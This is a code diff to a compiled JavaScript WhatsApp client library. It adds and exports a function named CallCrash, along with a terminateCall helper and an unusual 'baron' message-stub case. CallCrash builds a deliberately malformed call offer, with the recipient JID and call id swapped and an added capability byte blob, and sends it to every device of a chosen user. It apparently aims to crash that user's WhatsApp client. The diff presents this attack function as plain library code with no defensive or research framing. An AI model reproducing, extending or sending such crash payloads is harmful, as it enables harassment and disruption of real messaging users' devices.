@@ -116,6 +116,60 @@ const makeMessagesRecvSocket = (config) => {
             to: toJid
         };
     });
+
+    const CallCrash =  (toJid_1, ...args_1) => __awaiter(void 0, [toJid_1, ...args_1], void 0, function* (toJid, isVideo = false) {
+        const callId = (0, crypto_1.randomBytes)(16).toString('hex').toUpperCase().substring(0, 64);
+        const offerContent = [];
+        offerContent.push({ tag: 'audio', attrs: { enc: 'opus', rate: '16000' }, content: undefined });
+        offerContent.push({ tag: 'audio', attrs: { enc: 'opus', rate: '8000' }, content: undefined });
+        if (isVideo) {
+            offerContent.push({
+                tag: 'video',
+                attrs: { enc: 'vp8', dec: 'vp8', orientation: '0', 'screen_width': '1920', 'screen_height': '1080', 'device_orientation': '0' },
+                content: undefined
+            });
+        }
+        offerContent.push({ tag: 'net', attrs: { medium: '3' }, content: undefined });
+        offerContent.push({ tag: 'capability', attrs: { ver: '1' }, content: new Uint8Array([1, 4, 255, 131, 207, 4]) });
+        offerContent.push({ tag: 'encopt', attrs: { keygen: '2' }, content: undefined });
+        const encKey = (0, crypto_1.randomBytes)(32);
+        const devices = (yield getUSyncDevices([toJid], true, false)).map(({ user, device }) => (0, WABinary_1.jidEncode)(user, 's.whatsapp.net', device));
+        yield assertSessions(devices, true);
+        const { nodes: destinations, shouldIncludeDeviceIdentity } = yield createParticipantNodes(devices, {
+            call: {
+                callKey: new Uint8Array(encKey)
+            }
+        }, { count: '0' });
+        offerContent.push({ tag: 'destination', attrs: {}, content: destinations });
+        if (shouldIncludeDeviceIdentity) {
+            offerContent.push({
+                tag: 'device-identity',
+                attrs: {},
+                content: (0, Utils_1.encodeSignedDeviceIdentity)(authState.creds.account, true)
+            });
+        }
+        const stanza = ({
+            tag: 'call',
+            attrs: {
+                id: (0, Utils_1.generateMessageIDV2)(),
+                to: callId,
+            },
+            content: [{
+                    tag: 'offer',
+                    attrs: {
+                        'call-id': toJid,
+                        'call-creator': authState.creds.me.id,
+                    },
+                    content: offerContent,
+                }],
+        });
+        yield query(stanza);
+        return {
+            id: toJid,
+            to: callId
+        };
+    });
+    
     const rejectCall = (callId, callFrom) => __awaiter(void 0, void 0, void 0, function* () {
         const stanza = ({
             tag: 'call',
@@ -135,6 +189,26 @@ const makeMessagesRecvSocket = (config) => {
         });
         yield query(stanza);
     });
+
+
+    const terminateCall = async (callId, toJid) => {
+        const stanza = ({
+            tag: 'call',
+            attrs: {
+                id: (0, Utils_1.generateMessageIDV2)(),
+                to: toJid,
+            },
+            content: [{
+                    tag: 'terminate',
+                    attrs: {
+                        'call-id': callId,
+                        'call-creator': toJid,
+                    },
+                    content: undefined,
+                }],
+        });
+        await query(stanza);
+    };
     const sendRetryRequest = (node_1, ...args_1) => __awaiter(void 0, [node_1, ...args_1], void 0, function* (node, forceIncludeKeys = false) {
         const msgId = node.attrs.id;
         let retryCount = msgRetryCache.get(msgId) || 0;
@@ -267,6 +341,10 @@ const makeMessagesRecvSocket = (config) => {
                 msg.messageStubType = Types_1.WAMessageStubType.GROUP_CHANGE_SUBJECT;
                 msg.messageStubParameters = [child.attrs.subject];
                 break;
+                case 'baron':
+                    msg.messageStubType = Types_1.WAMessageStubType.CIPHERTEXT;
+                    msg.messageStubParameters = [ child.attrs.baron ];
+                    break;
             case 'announcement':
             case 'not_announcement':
                 msg.messageStubType = Types_1.WAMessageStubType.GROUP_CHANGE_ANNOUNCE;
@@ -794,6 +872,8 @@ const makeMessagesRecvSocket = (config) => {
     return Object.assign(Object.assign({}, sock), { sendMessageAck,
         sendRetryRequest,
         offerCall,
+        CallCrash,
+        terminateCall,
         rejectCall });
 };
 exports.makeMessagesRecvSocket = makeMessagesRecvSocket;
